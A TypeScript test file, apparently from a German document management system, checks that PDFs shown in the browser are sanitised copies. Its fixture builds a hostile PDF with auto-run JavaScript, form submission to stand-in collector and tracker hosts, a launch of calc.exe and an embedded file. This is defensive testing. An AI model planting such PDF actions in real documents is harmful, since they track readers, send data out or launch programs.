/** Anzeige von PDFs im Browser nur als bereinigte Kopie (#639): nichts ausführen, nichts nachladen, nichts senden. */
import assert from 'node:assert/strict';
import { after, describe, it } from 'node:test';
import { PDFDocument, PDFName, PDFString, StandardFonts } from 'pdf-lib';
import { beendeArbeiter } from '../src/arbeit';
import { speicherDateien } from '../src/dateispeicher';
import { Dienst } from '../src/dienst';
import { speicherEinstellungen } from '../src/einstellungen';
import { Konten } from '../src/konten';
import { speicherKontoRepo } from '../src/konto-repo';
import { bereinigePdf } from '../src/pdf/anzeige';
import { liesPdfA } from '../src/pdf/archiv';
import { leereAnzeigeCache } from '../src/pdfanzeige';
import { speicherRepo } from '../src/repo-speicher';
import { dateiKoepfe, routen, type Anfrage, type Datei } from '../src/routen';

after(() => beendeArbeiter());

const SKRIPT = 'app.launchURL("https://tracker.example.org/geoeffnet")';
const ANHANG = 'GEHEIMER-ANHANG-INHALT';

/** PDF mit allem, was beim Ansehen nichts tun soll – und einem harmlosen Link, der bleiben soll. */
async function boesesPdf(): Promise<Buffer> {
  const doc = await PDFDocument.create();
  const seite = doc.addPage([300, 200]);
  seite.drawText('Rechnung', { x: 20, y: 150, size: 18, font: await doc.embedFont(StandardFonts.Helvetica) });
  const ctx = doc.context;
  const js = ctx.register(ctx.stream(SKRIPT));
  // Beim Öffnen: JavaScript; Dokument- und Seitenaktionen.
  doc.catalog.set(PDFName.of('OpenAction'), ctx.obj({ S: 'JavaScript', JS: js }));
  doc.catalog.set(PDFName.of('AA'), ctx.obj({ WC: { S: 'JavaScript', JS: PDFString.of('app.alert(1)') } }));
  seite.node.set(PDFName.of('AA'), ctx.obj({ O: { S: 'Launch', F: PDFString.of('calc.exe') } }));
  // Namensbaum mit Skript und eingebetteter Datei.
  const datei = ctx.register(ctx.stream(ANHANG, { Type: 'EmbeddedFile' }));
  const spec = ctx.obj({ Type: 'Filespec', F: PDFString.of('anhang.txt'), EF: { F: datei } });
  doc.catalog.set(PDFName.of('Names'), ctx.obj({
    JavaScript: { Names: [PDFString.of('start'), ctx.obj({ S: 'JavaScript', JS: PDFString.of('this.submitForm("https://sammler.example.org")') })] },
    EmbeddedFiles: { Names: [PDFString.of('anhang.txt'), spec] },
  }));
  // Anmerkungen: Formular senden, Fernziel, Dateianhang – und ein normaler Link.
  const anm = (o: Record<string, unknown>) => ctx.register(ctx.obj({ Type: 'Annot', Rect: [10, 10, 60, 30], ...o }));
  seite.node.set(PDFName.of('Annots'), ctx.obj([
    anm({ Subtype: 'Link', A: { S: 'SubmitForm', F: { FS: 'URL', F: PDFString.of('https://sammler.example.org/form') } } }),
    anm({ Subtype: 'Link', A: { S: 'GoToR', F: PDFString.of('anders.pdf'), D: [0, PDFName.of('Fit')] } }),
    anm({ Subtype: 'FileAttachment', FS: spec }),
    anm({ Subtype: 'Link', A: { S: 'URI', URI: PDFString.of('https://www.example.org/hilfe') } }),
  ]));
  doc.catalog.set(PDFName.of('AcroForm'), ctx.obj({ Fields: [], XFA: PDFString.of('<xdp/>') }));
  return Buffer.from(await doc.save({ useObjectStreams: false }));
}

describe('PDF-Anzeige (#639): bereinigte Kopie', () => {
  it('entfernt JavaScript, automatische Aktionen, Senden, Start-/Fernaktionen und eingebettete Dateien; Links bleiben', async () => {
    const original = await boesesPdf();
    const vorher = await liesPdfA(original);
    assert.equal(vorher.javascript, true);
    assert.ok(vorher.aktionen.includes('SubmitForm') && vorher.aktionen.includes('AA'), vorher.aktionen.join(', '));
    const { pdf, entfernt } = await bereinigePdf(original);
    const nachher = await liesPdfA(pdf);
    assert.equal(nachher.lesbar, true);
    assert.equal(nachher.seiten, 1);
    assert.equal(nachher.javascript, false);
    assert.deepEqual(nachher.aktionen, ['URI'], 'nur der normale Link bleibt');
    assert.deepEqual(nachher.extern, ['https://www.example.org/hilfe']);
    const roh = Buffer.from(pdf).toString('latin1');
    for (const t of ['launchURL', 'app.alert', 'submitForm', 'calc.exe', ANHANG, '/EmbeddedFile', '/OpenAction', '/XFA', 'FileAttachment', 'anders.pdf']) assert.ok(!roh.includes(t), `${t} steht noch in der Kopie`);
    assert.ok(roh.includes('www.example.org/hilfe'));
    assert.ok(entfernt.includes('OpenAction') && entfernt.includes('JavaScript') && entfernt.includes('EF'), entfernt.join(', '));
    // Ein harmloses PDF bleibt lesbar und meldet nichts.
    const harmlos = await PDFDocument.create(); harmlos.addPage();
    assert.deepEqual((await bereinigePdf(await harmlos.save())).entfernt, []);
  });

  it('verschlüsselt oder kaputt: wirft', async () => {
    await assert.rejects(bereinigePdf(Buffer.from('%PDF-1.7\nkaputt')));
    const enc = Buffer.from((await boesesPdf()).toString('latin1').replace('trailer\n<<', 'trailer\n<<\n/Encrypt << /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >>'), 'latin1');
    await assert.rejects(bereinigePdf(enc), /verschlüsselt|encrypt/i);
  });

  it('Anzeige in der Oberfläche bereinigt; Herunterladen, API-Schlüssel und Weitergeben liefern das Original', async () => {
    leereAnzeigeCache();
    const d = new Dienst(speicherRepo(), speicherDateien(), { einstellungen: speicherEinstellungen() });
    const konten = new Konten(speicherKontoRepo(), null, 'http://nas', d.systemtypen.benutzerspiegel());
    const { benutzer: admin } = await konten.einrichten({ email: 'admin@example.org', name: 'Lena', passwort: 'ein-langes-passwort' });
    await d.postSystemmappen.gleicheBenutzerAb(await konten.listeBenutzer());
    const typ = await d.mappentypen.legeTypAn({ name: 'Rechnung', felder: [{ key: 'nr', label: 'Nr', typ: 'text', pflicht: true }], register: [
      { key: 'allgemein', name: 'Allgemein', art: 'felder', felder: ['nr'] }, { key: 'dokumente', name: 'Dokumente', art: 'dokumente', versionierung: true },
    ] });
    const m = await d.mappen.legeMappeAn({ typId: typ.id, werte: { nr: 'B-1' } });
    const original = await boesesPdf();
    const id = (await d.dokumente.ladeHoch(m.id, { register: 'dokumente', name: 'brief.pdf', typ: 'application/pdf' }, original, null)).dokument.id;
    const tabelle = routen(d, konten, {});
    const inhalt = tabelle.find((r) => r.methode === 'GET' && r.pfad === '/api/dokumente/:id/inhalt')!;
    const rufe = async (x: Partial<Anfrage> = {}) => (await inhalt.handler({ body: {}, params: { id }, query: {}, ip: '1', benutzer: admin, ...x } as Anfrage)).datei as Datei;
    const anzeige = await rufe();
    assert.equal(anzeige.anzeigen, true);
    assert.equal(anzeige.koepfe?.['x-dms-anzeige'], 'bereinigt');
    assert.equal((await liesPdfA(anzeige.inhalt as Buffer)).javascript, false);
    assert.equal(dateiKoepfe(anzeige)['content-disposition'].split(';')[0], 'inline');
    // Zweites Ansehen aus dem Zwischenspeicher: gleiche Kopie.
    assert.ok((await rufe()).inhalt === anzeige.inhalt);
    const laden = await rufe({ query: { herunterladen: '1' } });
    assert.equal(laden.anzeigen, false);
    assert.equal(laden.koepfe?.['x-dms-anzeige'], undefined);
    const roh = async (x: Datei) => Buffer.isBuffer(x.inhalt) ? x.inhalt : Buffer.concat(await x.inhalt.toArray());
    assert.ok((await roh(laden)).equals(original), 'Herunterladen: Original');
    const api = await rufe({ apiSchluessel: { id: 'k1', recht: 'lesen' } as never });
    assert.equal(api.koepfe?.['x-dms-anzeige'], undefined);
    assert.ok((await roh(api)).equals(original), 'API-Schlüssel: Original');
    // Unbereinigbar: Hinweis statt Anzeige, in der Sandbox.
    const kaputt = (await d.dokumente.ladeHoch(m.id, { register: 'dokumente', name: 'kaputt.pdf', typ: 'application/pdf' }, Buffer.from('%PDF-1.7\nkaputt'), null)).dokument;
    assert.equal(kaputt.mime, 'application/pdf');
    const h = (await inhalt.handler({ body: {}, params: { id: kaputt.id }, query: {}, ip: '1', benutzer: admin } as Anfrage)).datei as Datei;
    assert.equal(h.koepfe?.['x-dms-anzeige'], 'nur-herunterladen');
    assert.match(String(h.inhalt), /herunter/);
    assert.match(dateiKoepfe(h)['content-security-policy'] ?? '', /sandbox/);
  });
});
